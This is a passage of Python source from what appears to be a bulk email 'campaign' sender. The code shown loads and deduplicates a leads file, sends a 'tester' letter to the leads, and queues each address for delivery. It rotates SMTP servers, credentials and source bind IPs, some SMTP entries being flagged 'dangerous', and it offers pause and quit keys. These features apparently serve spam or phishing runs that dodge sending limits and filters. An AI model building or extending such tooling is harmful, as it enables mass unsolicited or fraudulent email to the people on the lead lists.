                                if select.select([sys.stdin], [], [], 0)[0]:
                                    key = sys.stdin.read(1).upper()
                                    if key == 'P':
                                        manual_pause = True
                                        update_pause_event()
                                        print(f"{Fore.YELLOW}[PAUSED] Press 'R' to resume...{Style.RESET_ALL}")
                                    elif key == 'R':
                                        manual_pause = False
                                        update_pause_event()
                                        print(f"{Fore.GREEN}[RESUMED] Continuing...{Style.RESET_ALL}")
                                    elif key == 'Q':
                                        print(f"{Fore.RED}[QUIT] Stopping campaign...{Style.RESET_ALL}")
                                        stop_event.set()
                                        import os
                                        os._exit(0)
                                time.sleep(0.1)
                            except:
                                pass
                
                listener_thread = threading.Thread(target=keyboard_listener, daemon=True)
                listener_thread.start()
                
                # Wait for sorter to finish
                print(f"{Fore.CYAN}[SORTER+SEND] Waiting for sorter to complete...{Style.RESET_ALL}")
                sorter_thread.join()
                
                # Allow brief time for any final emails from sorter
                print(f"{Fore.CYAN}[SORTER+SEND] Sorter completed; monitor will continue watching sorted files. Press 'Q' to quit.{Style.RESET_ALL}")
                time.sleep(1)
                # Do not stop monitor here — keep watching files and sending continuously
            
            # ============= STANDARD MODE (leads.txt) =============
            else:
                if use_sort:
                    file = resolve_leads_path(file)
                    lines = open(file).read()
                    inputs = sort_leads(lines,IGNList,IGType)
                else:
                    file = resolve_leads_path(file)
                    inputs = [line.strip() for line in open(file, 'r', encoding='utf-8').read().splitlines() if line.strip()]

                # v8.3: remember the leads file so delete_config removes fully
                # processed leads from the same file that was just loaded.
                delete_leads_path = file

                # Deduplicate leads while preserving original order and formatting
                seen = set()
                deduped = []
                total_inputs = len(inputs)
                print(f"{Fore.CYAN}[TRACE] Loaded {total_inputs} lead(s) from {file}{Style.RESET_ALL}", flush=True)
                # ===== test&send / tester pre-campaign test phase =====
                if test_and_send_mode and enable_sender:
                    phase_ok = run_test_send_phase(
                        inputs,
                        smtpserv, port, its_authy, username, password,
                        fromemail, sender, its_secure,
                        smtp_pool_entries=smtp_pool_entries,
                        use_random_smtp=useRandomSmtp,
                    )
                    if phase_ok is False:
                        # Defensive fallback: v8.9 never returns False (the test
                        # phase is non-fatal), but keep the caller safe.
                        print(f"{Fore.RED}[TEST&SEND] Test phase reported a fatal error; sender stopped.{Style.RESET_ALL}", flush=True)
                        sys.exit(1)
                    if tester_token and tester_mode and not tester_send_mode:
                        print(f"\n{Fore.GREEN}{'=' * 62}{Style.RESET_ALL}", flush=True)
                        print(f"{Fore.GREEN}[TESTER] Tester mode complete: the tester letter was delivered to the leads.{Style.RESET_ALL}", flush=True)
                        print(f"{Fore.GREEN}[TESTER] The 'tester' token runs the tester only, so the main campaign will NOT run.{Style.RESET_ALL}", flush=True)
                        print(f"{Fore.GREEN}[TESTER] Use the 'tester&send' token in sending_mode (or set test_config.tester&send: true) to run the main campaign after the tester.{Style.RESET_ALL}", flush=True)
                        print(f"{Fore.GREEN}{'=' * 62}{Style.RESET_ALL}", flush=True)
                        sys.exit(0)
                for line_num, line in enumerate(inputs, start=1):
                    # strip whitespace around each address
                    email = line.strip()
                    if line_num in test_send_campaign_done:
                        print(f"{Fore.CYAN}[TRACE] Line {line_num} ({email}) was already campaign-sent in the 1by1 test&send phase; skipped.{Style.RESET_ALL}", flush=True)
                        continue
                    if campaign_lead_skip_processed(email):
                        # v7/v8: skip leads already processed by tester&send - in
                        # this same campaign loop (duplicate lines) or, when
                        # ledger_persist is on, in the carried-over ledger.
                        print(f"{Fore.CYAN}[TRACE] Line {line_num} ({email}) was already processed by tester&send ({'ledger' if test_send_ledger_persist else 'this run'}); skipped.{Style.RESET_ALL}", flush=True)
                        continue
                    route = describe_delivery_target(email, smtpserv)
                    header_status = 'Message-ID enabled' if custom_headers_enabled else 'headers disabled'
                    print(f"{Fore.CYAN}[TRACE] Queueing line {line_num}/{total_inputs}: {email} via {route} [{header_status}]{Style.RESET_ALL}", flush=True)

                    if check(email):
                        # Check for pause
                        if not pause_event.is_set():
                            print(f"{Fore.YELLOW}[PAUSED] Waiting to resume...{Style.RESET_ALL}")
                            pause_event.wait()
                        bind_ip = get_next_bind_ip()
                        if useRandomSmtp:
                            selected_smtp = resolve_campaign_smtp(line_num, smtp_pool_entries, smtp_selection_system)
                            smtpserv = selected_smtp['smtp_server']
                            port = selected_smtp['smtp_port']
                            its_authy = selected_smtp['smtp_authy']
                            username = selected_smtp['smtp_username']
                            password = selected_smtp['smtp_password']
                            fromemail= selected_smtp['msg_fromemail']
                            sender = selected_smtp['smtp_fromemail']
                            its_secure = selected_smtp['smtp_secure']
                        queue.put((email,smtpserv,port,its_authy,username,password,fromemail,sender,its_secure,line_num,None,bind_ip,selected_smtp.get('smtp_dangerous', False) if useRandomSmtp else None))
                    else:
                        print(f"{Fore.CYAN}[SEND] Skipping invalid line {line_num}/{total_inputs}: {email}{Style.RESET_ALL}", flush=True)
                        queue.put((email,None,None,None,None,None,None,None,None,line_num,None,None))
                # end for loop over inputs
                
                # Start keyboard listener for standard mode
                def keyboard_listener_standard():
                    global manual_pause
                    def update_pause_event():
                        if manual_pause:
                            pause_event.clear()
                        else:
                            pause_event.set()
                    
                    if system_name().lower() == 'windows':
                        import msvcrt
                        while queue.unfinished_tasks > 0:
                            try:
                                if msvcrt.kbhit():
                                    key = msvcrt.getch().decode().upper()
                                    if key == 'P':
                                        manual_pause = True
                                        update_pause_event()
                                        print(f"{Fore.YELLOW}[PAUSED] Press 'R' to resume...{Style.RESET_ALL}")
                                    elif key == 'R':
                                        manual_pause = False
                                        update_pause_event()
                                        print(f"{Fore.GREEN}[RESUMED] Continuing...{Style.RESET_ALL}")
                                    elif key == 'Q':
                                        print(f"{Fore.RED}[QUIT] Stopping campaign...{Style.RESET_ALL}")
                                        import os
                                        os._exit(0)
                                time.sleep(0.1)
                            except:
                                pass
                    else:
                        import select
                        while queue.unfinished_tasks > 0:
                            try:
                                if select.select([sys.stdin], [], [], 0)[0]:
                                    key = sys.stdin.read(1).upper()
                                    if key == 'P':
                                        manual_pause = True
                                        update_pause_event()
                                        print(f"{Fore.YELLOW}[PAUSED] Press 'R' to resume...{Style.RESET_ALL}")
                                    elif key == 'R':
                                        manual_pause = False
                                        update_pause_event()
                                        print(f"{Fore.GREEN}[RESUMED] Continuing...{Style.RESET_ALL}")
                                    elif key == 'Q':
                                        print(f"{Fore.RED}[QUIT] Stopping campaign...{Style.RESET_ALL}")
                                        import os
                                        os._exit(0)
                                time.sleep(0.1)
                            except:
                                pass
                
                listener_thread = threading.Thread(target=keyboard_listener_standard, daemon=True)
                listener_thread.start()
                
                queue.join()
                print_success_summary()

        except Exception as e:
            print(str(e))

    elif __name__ == '__main__' and not enable_sender:
        print(f"{Fore.YELLOW}[INFO] Sender is disabled in setup.ini (sender: False){Style.RESET_ALL}")
        exit(0)
    elif __name__ == '__main__':
        exit()

except Exception as e:
    print(f"[!] Exception: {str(e)} exiting...")
    exit()

